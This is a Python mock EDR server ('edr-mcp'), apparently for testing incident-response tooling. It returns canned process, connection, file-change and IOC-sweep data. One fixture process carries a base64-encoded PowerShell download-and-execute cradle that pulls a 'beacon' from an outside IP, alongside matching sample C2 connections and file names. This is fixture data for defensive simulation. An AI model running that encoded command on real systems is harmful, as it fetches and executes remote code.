import random
from datetime import datetime, timezone
from typing import Any


SERVER_NAME = "edr-mcp"

def handle_action(action: str, params: dict[str, Any]) -> list[dict[str, Any]]:
    if action == "get_processes":
        host = params.get("host", "unknown")
        return _mock_processes(host)
    elif action == "get_network_connections":
        host = params.get("host", "unknown")
        return _mock_connections(host)
    elif action == "get_file_changes":
        host = params.get("host", "unknown")
        return _mock_file_changes(host)
    elif action == "isolate_host":
        host = params.get("host", "")
        return [{"status": "isolated", "host": host, "timestamp": datetime.now(timezone.utc).isoformat()}]
    elif action == "kill_process":
        pid = params.get("pid", 0)
        return [{"status": "terminated", "pid": pid, "timestamp": datetime.now(timezone.utc).isoformat()}]
    elif action == "sweep_iocs":
        iocs = params.get("iocs", [])
        return _mock_ioc_sweep(iocs)
    else:
        return [{"error": f"Unknown action: {action}"}]


def _mock_processes(host: str) -> list[dict[str, Any]]:
    return [
        {"pid": 1234, "name": "svchost.exe", "cpu": 2.1, "memory_mb": 45, "path": "C:\\Windows\\System32\\svchost.exe", "signed": True},
        {"pid": 5678, "name": "powershell.exe", "cpu": 12.5, "memory_mb": 210, "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "signed": True, "cmdline": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADQAMgAuADUAMwAuADIANgAvAGIAZQBhAGMAbwBuACcAKQA="},
        {"pid": 9012, "name": "notepad.exe", "cpu": 0.0, "memory_mb": 12, "path": "C:\\Program Files\\Windows NT\\Accessories\\notepad.exe", "signed": True},
    ]


def _mock_connections(host: str) -> list[dict[str, Any]]:
    return [
        {"local_ip": "10.0.1.50", "local_port": 445, "remote_ip": "10.0.30.50", "remote_port": 49152, "protocol": "TCP", "state": "ESTABLISHED"},
        {"local_ip": "10.0.1.50", "local_port": 3389, "remote_ip": "185.142.53.22", "remote_port": 4444, "protocol": "TCP", "state": "ESTABLISHED"},
        {"local_ip": "10.0.1.50", "local_port": 53, "remote_ip": "8.8.8.8", "remote_port": 53, "protocol": "UDP", "state": "ACTIVE"},
    ]


def _mock_file_changes(host: str) -> list[dict[str, Any]]:
    return [
        {"path": "C:\\Users\\Public\\beacon.exe", "action": "created", "timestamp": datetime.now(timezone.utc).isoformat(), "size_kb": 345},
        {"path": "C:\\Windows\\Tasks\\update.ps1", "action": "modified", "timestamp": datetime.now(timezone.utc).isoformat(), "size_kb": 12},
    ]


def _mock_ioc_sweep(iocs: list[str]) -> list[dict[str, Any]]:
    """Return EDR endpoint matches for a list of IOCs (process hashes, files)."""
    results = []
    for ioc in iocs[:5]:
        hits = random.randint(0, 2)
        for _ in range(hits):
            results.append({
                "ioc": ioc,
                "source": "edr-mcp",
                "host": random.choice(["WS-022", "SRV-WEB-01", "DC-01", "WS-FINANCE-22"]),
                "os": random.choice(["Windows 11", "Windows Server 2022"]),
                "process_name": random.choice(["powershell.exe", "cmd.exe", "rundll32.exe", "wscript.exe"]),
                "pid": random.randint(1000, 9999),
                "file_path": f"C:\\Users\\Public\\{random.choice(['malware.exe', 'beacon.dll', 'update.ps1', 'payload.vbs'])}",
                "matched_on": random.choice(["hash", "network_connection", "file_write", "registry_change"]),
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })
    return results
